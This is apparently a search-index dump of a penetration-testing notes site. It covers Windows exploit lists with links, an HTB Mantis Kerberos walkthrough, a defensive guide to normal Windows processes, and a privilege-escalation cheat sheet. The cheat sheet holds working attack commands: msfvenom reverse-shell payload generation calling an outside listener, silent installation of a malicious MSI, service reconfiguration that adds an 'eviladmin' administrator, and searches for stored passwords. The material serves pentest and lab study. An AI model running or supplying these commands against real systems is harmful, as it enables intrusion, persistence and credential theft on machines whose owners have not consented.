7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016 CVE-2017-0143 to CVE-2017-0148 Exploit: - https://github.com/worawit/MS17-010 - https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - exploit/windows/smb/ms17_010_eternalblue References: - https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/ - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/","title":"MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption"},{"location":"os/windows/important-issues/#other-local","text":"","title":"Other (Local)"},{"location":"os/windows/important-issues/#ms17-013-microsoft-graphics-componen","text":"Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016, Exploit: - https://www.exploit-db.com/exploits/41656 References:","title":"MS17-013 - Microsoft Graphics Componen"},{"location":"os/windows/important-issues/#ms10-061-windows-printer-spooler-stuxnet","text":"XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2 Execute code with SYSTEM privilege if a printer is shared on the network (patched September 2010) Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived) Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: %SystemRoot%\\system32 ) Sending WritePrinter requests, an attacker can fully control the content of the created file Gain code execution by writing to a directory used by WMI to deploy applications Wbem\\Mof is periodically scanned and any new .mof files References: - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html - os/windows/wmi.md","title":"MS10-061 - Windows Printer Spooler (Stuxnet)"},{"location":"os/windows/important-issues/#privilege-escalation-exploits","text":"","title":"Privilege Escalation Exploits"},{"location":"os/windows/important-issues/#ms16-032-secondary-logon-to-address-elevation-of-privilege","text":"Win7-Win10 2008-2012 - 32/64 bit Machine must have 2+ CPU cores Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032 - http://willgenovese.com/ms16-032-one-liners/ - ms16_032_secondary_logon_handle_privesc References: - https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html","title":"MS16-032 - Secondary Logon to Address Elevation of Privilege"},{"location":"os/windows/important-issues/#ms11-080-ancillary-function-driver-afdjoinleaf","text":"XP, 2003 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 - https://www.exploit-db.com/exploits/18176 - https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html python py installer module python pyinsaller.py --onefile example.py","title":"MS11-080 -  Ancillary Function Driver (AfdJoinLeaf)"},{"location":"os/windows/important-issues/#ms12-042-windows-kernel-sysret","text":"XP SP3, 2003, 7, 2008 R2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042 - https://www.exploit-db.com/exploits/20861","title":"MS12-042 - Windows Kernel - SYSRET"},{"location":"os/windows/important-issues/#ms15-051-windows-kernel-mode-drivers-client_copy_image","text":"2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 - https://www.exploit-db.com/exploits/37049 - https://github.com/hfiref0x/CVE-2015-1701 - exploit/windows/local/ms15_051_client_copy_image References: - https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","title":"MS15-051 - Windows Kernel-Mode Drivers (client_copy_image)"},{"location":"os/windows/important-issues/#ms10-092-task-scheduler","text":"Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092 - exploit/windows/local/ms10_092_schelevator References: - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092 - http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf","title":"MS10-092 - Task Scheduler"},{"location":"os/windows/important-issues/#ms14-058-trackpopupmenu-win32k-null-pointer-dereference","text":"2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1, Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058 - exploit/windows/local/ms14_058_track_popup_menu References: - https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/ - https://www.freebuf.com/articles/system/50110.html","title":"MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference"},{"location":"os/windows/important-issues/#ms14-070-tcpipsetaddroptions-null-pointer-dereference","text":"2003 SP2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070 - exploit/windows/local/ms14_070_tcpip_ioctl References: - https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev - https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt","title":"MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference"},{"location":"os/windows/important-issues/#bypassuac_eventvwr","text":"","title":"bypassuac_eventvwr"},{"location":"os/windows/important-issues/#ms10-015-kitrap0d","text":"","title":"MS10-015 - Kitrap0d"},{"location":"os/windows/important-issues/#ms14-068-kerberos-domain-privilege-escalation","text":"Exploits: - Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek apt-get install krb5-user cifs-utils rdate # Add proper nameservers in /etc/hosts /etc/krb5.conf [libdefaults] default_realm = HTB.LOCAL # The following krb5.conf variables are only for MIT Kerberos. kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true #Edit the realms entry as follows: [realms] LAB.LOCAL = { kdc = mantis.htb.local:88 admin_server = mantis.htb.local default_domain = HTB.LOCAL } #Also edit the final section: [domain_realm] .domain.internal = HTB.LOCAL domain.internal = HTB.LOCAL net time -S 10.10.10.52 -U # Set local time accordingly # OR USE rdate -n 10.10.10.52 python ms14-068.py -u james@htb.local -d mantis.htb.local -p J@m3s_P@ssW0rd! -s S-1-5-21-4220043660-4019079961-2895681657 Rename the generated ticket to \u200b /tmp/krb5cc_0\u200b mv TGT_James@HTB.local.ccache /tmp/krb5cc_0 With Impacket (Golden PAC module): - kinit james (options ?) - klist (options ?) - \u200b python goldenPac.py htb.local/james@mantis.htb.local \u200b - Entering the password for the \u200b james \u200b user Manually: smbclient -W HTB.LOCAL //MANTIS/c$ -k References: - Additional information about CVE-2014-6324 - Attack Methods for Gaining Domain Admin Rights in Active Directory - HTB - Mantis","title":"MS14-068 - Kerberos Domain Privilege Escalation"},{"location":"os/windows/important-issues/#cve-2017-0213-com-aggregate-marshaleriremunknown2-type-confusion-privilege-escalation","text":"10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016 When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP. Exploit: - https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 References: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1107 - https://www.exploit-db.com/exploits/42020","title":"CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation"},{"location":"os/windows/important-processes/","text":"Important Processes Idle and System Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads. No visible parent processes System has a static PID of 4 System creates smss.exe There should only be one system process running SMSS - Session Manager First user mode process Parent process is System Base Priority of 11 Username: NT AUTHORITY\\SYSTEM Performs delayed file delete/rename changes Loads known dlls Runs from %systemroot%\\System32\\smss.exe Creates session 0 (OS services) Creates session 1 (User session) Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1 Runs within session 0 Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0. There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system. CSRSS.EXE - Client/Server Run Windows subsystem process. Base Priority of 13 %SystemRoot%\\system32\\csrss.exe Username: NT AUTHORITY\\SYSTEM Creates/Deletes processes and threads, Temp files, etc. In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe One csrss process per session Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.) Runs within session 0 WININIT.EXE - Windows Initialization Process Parent to services.exe (SCM), lsass.exe and lsm.exe Created by smss.exe, but since smss.exe exits there is no parent to WININIT. Base Priority of 13 Username: NT AUTHORITY\\SYSTEM %SystemRoot%\\system32\\wininit.exe Performs user-mode initialization tasks Creates %windir%\\temp Runs within session 0 SERVICES.EXE - Service Control Manager Child to WININIT.EXE Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\\CurrentControlSet\\Services %SystemRoot%\\System32\\wininit.exe Username: NT AUTHORITY\\SYSTEM Base Priority of 9 Loads a database of services into memory Runs within session 0 There should only be one services.exe process running LSASS.EXE - Local Security Authority Child to WININIT.EXE Only one lsass.exe process %SystemRoot%\\System32\\lsass.exe Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc. Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These \"fake\" names will not be a children of wininit.exe. Base Priority of 9 Username: NT AUTHORITY\\SYSTEM Runs within session 0 It should not have child processes SVCHOST.EXE - Service Hosting Process Multiple instances of svchost.exe can/do exist/run %SystemRoot%\\System32\\svchost.exe Username: Should only be one of three options: NT AUTHORITY\\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE Should always have a parent of services.exe Base Priority of 8 Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe. Command Line: svchost.exe -k -k values should exist within the Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost registry key Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3. They should all be running within session 0 LSM.EXE - Load Session Manager Service Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions. Child to wininit.exe It should not have child processes Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open. %systemroot%\\System32\\lsm.exe Base Priority of 8 Username: NT AUTHORITY\\SYSTEM Runs within session 0 WINLOGON.EXE - Windows Logon Process No parent process Could have a child process of LogonUI if smartcard, etc. are used to authenticate LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information. Base Priority of 13 Runs within session one Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete) Loads Userinit within Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons. Userinit.exe exits once it runs so you wont see this process running when you look. Userinit initializes the user environment. This includes running GPOs and logon scripts. Will run Shell value located at Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values. Since Userinit exists this is also why Explorer.exe doesn't have a parent process. Explorer.exe - AKA Windows Explorer No parent process since Userinit.exe exits The value \"Explorer.exe\" is stored in shell value within the registry. The registry location is here: Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Base Priority of 8 Username: The logged on user account. %Systemroot%\\Explorer.exe This will contain multiple child processes. Some of you might know this better as, \"Windows Explorer\" This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here. Checklist Simple checklist to review while looking for malicious/suspect process activity. Check the parent/child relationships of processes. Check which users names the processes are running under Check their command line parameters for those processes that use them. Check their digital signatures Check their base priorities Check the location they are being from Check their spellings Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days. When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process. Check and see if processes that should not be connecting out to the internet are not Check process privileges If wscript.exe process is running check the command line of what it is running. Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc. If rundll32.exe is running check its command line as well. \"Most\" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated. Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc. References Ref: http://sysforensics.org/2014/01/know-your-windows-processes. Link is not longer working. Ref: https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf","title":"Important Processes"},{"location":"os/windows/important-processes/#important-processes","text":"","title":"Important Processes"},{"location":"os/windows/important-processes/#idle-and-system","text":"Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads. No visible parent processes System has a static PID of 4 System creates smss.exe There should only be one system process running","title":"Idle and System"},{"location":"os/windows/important-processes/#smss-session-manager","text":"First user mode process Parent process is System Base Priority of 11 Username: NT AUTHORITY\\SYSTEM Performs delayed file delete/rename changes Loads known dlls Runs from %systemroot%\\System32\\smss.exe Creates session 0 (OS services) Creates session 1 (User session) Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1 Runs within session 0 Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0. There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system.","title":"SMSS - Session Manager"},{"location":"os/windows/important-processes/#csrssexe-clientserver-run","text":"Windows subsystem process. Base Priority of 13 %SystemRoot%\\system32\\csrss.exe Username: NT AUTHORITY\\SYSTEM Creates/Deletes processes and threads, Temp files, etc. In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe One csrss process per session Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.) Runs within session 0","title":"CSRSS.EXE - Client/Server Run"},{"location":"os/windows/important-processes/#wininitexe-windows-initialization-process","text":"Parent to services.exe (SCM), lsass.exe and lsm.exe Created by smss.exe, but since smss.exe exits there is no parent to WININIT. Base Priority of 13 Username: NT AUTHORITY\\SYSTEM %SystemRoot%\\system32\\wininit.exe Performs user-mode initialization tasks Creates %windir%\\temp Runs within session 0","title":"WININIT.EXE - Windows Initialization Process"},{"location":"os/windows/important-processes/#servicesexe-service-control-manager","text":"Child to WININIT.EXE Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\\CurrentControlSet\\Services %SystemRoot%\\System32\\wininit.exe Username: NT AUTHORITY\\SYSTEM Base Priority of 9 Loads a database of services into memory Runs within session 0 There should only be one services.exe process running","title":"SERVICES.EXE - Service Control Manager"},{"location":"os/windows/important-processes/#lsassexe-local-security-authority","text":"Child to WININIT.EXE Only one lsass.exe process %SystemRoot%\\System32\\lsass.exe Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc. Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These \"fake\" names will not be a children of wininit.exe. Base Priority of 9 Username: NT AUTHORITY\\SYSTEM Runs within session 0 It should not have child processes","title":"LSASS.EXE - Local Security Authority"},{"location":"os/windows/important-processes/#svchostexe-service-hosting-process","text":"Multiple instances of svchost.exe can/do exist/run %SystemRoot%\\System32\\svchost.exe Username: Should only be one of three options: NT AUTHORITY\\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE Should always have a parent of services.exe Base Priority of 8 Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe. Command Line: svchost.exe -k -k values should exist within the Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost registry key Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3. They should all be running within session 0","title":"SVCHOST.EXE - Service Hosting Process"},{"location":"os/windows/important-processes/#lsmexe-load-session-manager-service","text":"Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions. Child to wininit.exe It should not have child processes Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open. %systemroot%\\System32\\lsm.exe Base Priority of 8 Username: NT AUTHORITY\\SYSTEM Runs within session 0","title":"LSM.EXE - Load Session Manager Service"},{"location":"os/windows/important-processes/#winlogonexe-windows-logon-process","text":"No parent process Could have a child process of LogonUI if smartcard, etc. are used to authenticate LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information. Base Priority of 13 Runs within session one Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete) Loads Userinit within Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons. Userinit.exe exits once it runs so you wont see this process running when you look. Userinit initializes the user environment. This includes running GPOs and logon scripts. Will run Shell value located at Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values. Since Userinit exists this is also why Explorer.exe doesn't have a parent process.","title":"WINLOGON.EXE - Windows Logon Process"},{"location":"os/windows/important-processes/#explorerexe-aka-windows-explorer","text":"No parent process since Userinit.exe exits The value \"Explorer.exe\" is stored in shell value within the registry. The registry location is here: Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Base Priority of 8 Username: The logged on user account. %Systemroot%\\Explorer.exe This will contain multiple child processes. Some of you might know this better as, \"Windows Explorer\" This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here.","title":"Explorer.exe - AKA Windows Explorer"},{"location":"os/windows/important-processes/#checklist","text":"Simple checklist to review while looking for malicious/suspect process activity. Check the parent/child relationships of processes. Check which users names the processes are running under Check their command line parameters for those processes that use them. Check their digital signatures Check their base priorities Check the location they are being from Check their spellings Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days. When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process. Check and see if processes that should not be connecting out to the internet are not Check process privileges If wscript.exe process is running check the command line of what it is running. Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc. If rundll32.exe is running check its command line as well. \"Most\" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated. Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc.","title":"Checklist"},{"location":"os/windows/important-processes/#references","text":"Ref: http://sysforensics.org/2014/01/know-your-windows-processes. Link is not longer working. Ref: https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf","title":"References"},{"location":"os/windows/important-reg-locations/","text":"Important Registry Locations Installed programs cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall","title":"Important Registry Locations"},{"location":"os/windows/important-reg-locations/#important-registry-locations","text":"","title":"Important Registry Locations"},{"location":"os/windows/important-reg-locations/#installed-programs","text":"cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall","title":"Installed programs"},{"location":"os/windows/kernel-exploitation/","text":"Kernel Exploitation References Kernel Internals - Windows Sandbox: https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849","title":"Kernel Exploitation"},{"location":"os/windows/kernel-exploitation/#kernel-exploitation","text":"","title":"Kernel Exploitation"},{"location":"os/windows/kernel-exploitation/#references","text":"Kernel Internals - Windows Sandbox: https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849","title":"References"},{"location":"os/windows/privilege-escalation/","text":"Privilege Escalation Options Missing Patches Automated Deployment and Auto Logon Passwords AlwaysInstallElevated (any user can run MSI as SYSTEM) Misconfigured Services Guides https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html Tools https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb Metasploit In 32bit systems: local_exploit_suggester In 64bit systems: search exploit/windows/local PowerUp PowerUp to check for all service misconfigurations: Invoke-AllChecks Service Unquoted Path Get-ServiceUnquoted -Verbose Get-WmiObject -Class win32_service | f` * When service path is unquoted: C:\\PROGRAM FILES\\SUB DIR\\PROGRAM NAME Areas we can place files for exploit are marked with * C:\\PROGRAM*FILES\\SUB*DIR\\PROGRAM*NAME Examples: c:\\program.exe files\\sub dir\\program name c:\\program files\\sub.exe dir\\program name c:\\program files\\sub dir\\program.exe name Service binary in a location writable to current user Replace the binary to gain code execution. Get-ModifiableServiceFile -Verbose Service can be modified by current user Get-ModifiableService -Verbose Techniques Service Unquoted Path exploit/windows/local/trusted_service_path wmic service get name,displayname,pathname,startmode |findstr /i Auto |findstr /i /v C:\\Windows\\\\ |findstr /i /v C:\\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Leads to running: C:\\Program.exe C:\\Program Files.exe C:\\Program Files (x86)\\Program.exe C:\\Program Files (x86)\\Program Folder\\A.exe C:\\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Insecure Setup: C:\\Windows\\System32 sc create Vulnerable Service binPath= C:\\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe start=auto C:\\Windows\\System32 cd C:\\Program Files (x86) C:\\Program Files (x86) mkdir Program Folder\\A Subfolder C:\\Program Files (x86) icacls C:\\Program Files (x86)\\Program Folder /grant Everyone:(OI)(CI)F /T Folder Service Executable Privileges When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\\Authenticated Users:(I)(M)) So any application that gets installed on the root can be tampered with by a non-admin user. If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one. https://msdn.microsoft.com/en-us/library/bb727008.aspx If folder is writable, drop a exe and use \"Service Unquoted Path\" to execute: icacls C:\\Program Files (x86)\\Program Folder If service exe is writable to everyone, low privilege user can replace the exe with some other binary: icacls example.exe F = Full Control CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE. OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE. Service Permissions exploit/windows/local/service_permissions Approach 1 - Check permissions of service subinacl.exe /keyreg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service /display If service is editable, change the ImagePath to another exe. reg add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service /t REG_EXPAND_SZ /v ImagePath /d C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe /f or create a local admin with: sc config Vulnerable Service binpath= net user eviladmin P4ssw0rd@ /add sc config Vulnerable Service binpath= net localgroup Administrators eviladmin /add Approach 2 - Check services a given user can edit accesschk.exe -uwcqv testuser * AlwaysInstallElevated exploit/windows/local/always_install_elevated [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Installing MSI: msiexec /quiet /qn /i malicious.msi Payload Generation: msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe msfvenom -f msi-nouac -p windows/exec cmd= C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe malicious.msi Task Scheduler On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. Works only on Windows 2000, XP, or 2003 Must have local administrator net start Task Scheduler time at 06:42 /interactive C:\\Documents and Settings\\test\\Local Settings\\Temp\\Payload.exe DLL Hijacking (DLL preloading attack or a binary planting attack) https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in Dynamic-Link Library Search Order. The directory from which the application loaded. The system directory. The 16-bit system directory. The Windows directory. The current directory. The directories that are listed in the PATH environment variable. Services running under SYSTEM does not search through user path environment. Identify processes / services - Use procman (https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx). - Filter Result = NAME NOT FOUND and Path ends with dll - Look at the registry key ServiceDll of services ( Parameters ). Windows 7 IKE and AuthIP IPsec Keying Modules (IKEEXT) \u2013 wlbsctrl.dll Windows Media Center Receiver Service (ehRecvr) \u2013 ehETW.dll Windows Media Center Scheduler Service (ehSched) \u2013 ehETW.dll Can run Media Center services over command line: schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\mcupdate\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\MediaCenterRecoveryTask\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\ActivateWindowsSearch\u201d Windows XP Automatic Updates (wuauserv) \u2013 ifsproxy.dll Remote Desktop Help Session Manager (RDSessMgr) \u2013 SalemHook.dll Remote Access Connection Manager (RasMan) \u2013 ipbootp.dll Windows Management Instrumentation (winmgmt) \u2013 wbemcore.dll Audio Service (STacSV) \u2013 SFFXComm.dll SFCOM.DLL Intel(R) Rapid Storage Technology (IAStorDataMgrSvc) \u2013 DriverSim.dll Juniper Unified Network Service(JuniperAccessService) \u2013 dsLogService.dll Encase Enterprise Agent \u2013 SDDisk.dll Migrations CWDIllegalInDllSearch Allow user to change DLL search path algorithm [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] CWDIllegalInDllSearch 1, 2 or ffffffff ? The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) [ dlls not loaded ] The current working directory (CWD) Directories in the PATH environment variable (system then user) SetDllDirectory Removes the current working directory (CWD) from the search order SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) : The directory from which the application loaded [ added ] C:\\program files\\MyApp\\ 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) [ removed ] The current working directory (CWD) Directories in the PATH environment variable (system then user) SetDllDirectory(\"\") The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) [ removed ] The current working directory (CWD) Directories in the PATH environment variable (system then user) SafeDllSearchMode Enabled by default Can disable using [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] Calling the SetDllDirectory(\u201c\u201d) or SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) disables SafeDllSearchMode and uses the search order described for SetDllDirectory. DEV LoadLibraryEx (additional argument) SetEnvironmentVariable(TEXT(\u201cPATH\u201d),NULL) Change default installation folder to C:\\Program Files Fully qualified path when loading DLLs Use SetDllDirectory(\u201c\u201d) API removing the current working directory from the search order If software needs to be installed on the root check there are no binaries needing SYSTEM privileges If SYSTEM privileges are required then change the ACL\u2019s of the folder Remove the path entry from the SYSTEM path variable if not needed When enabled The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) The current working directory (CWD) Directories in the PATH environment variable (system then user) When disabled The directory from which the application loaded [ moved up the list ] The current working directory (CWD) 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) Directories in the PATH environment variable (system then user) Stored Credentials C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml dir c:\\*vnc.ini /s /b /c dir c:\\*ultravnc.ini /s /b /c dir c:\\ /s /b /c | findstr /si *vnc.ini findstr /si password *.txt | *.xml | *.ini findstr /si pass *.txt | *.xml | *.ini Unattended Installations post/windows/gather/enum_unattend Look for UserAccounts tag of Unattend.xml , sysprep.xml and sysprep.inf across the system, including: C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ Microsoft appends \"Password\" to all passwords within Unattend files before encoding them. Group Policy Preferences (GPP) Introduced from Windows Server 2008 GPP allows for configuration of Domain-attached machines via group policy . GPPs are stored in the SYSVOL share, which is world-readable to authenticated users. Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the logged-in user and pull down policies. Group Policies for account management are stored on the Domain Controller in Groups.xml files buried in the SYSVOL folder cpassword is used to set passwords for the Local Administrator account. Password is AES encrypted using a published key: https://msdn.microsoft.com/en-us/library/Cc422924.aspx Metasploit: post/windows/gather/credentials/gpp PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Decrypt encrypted 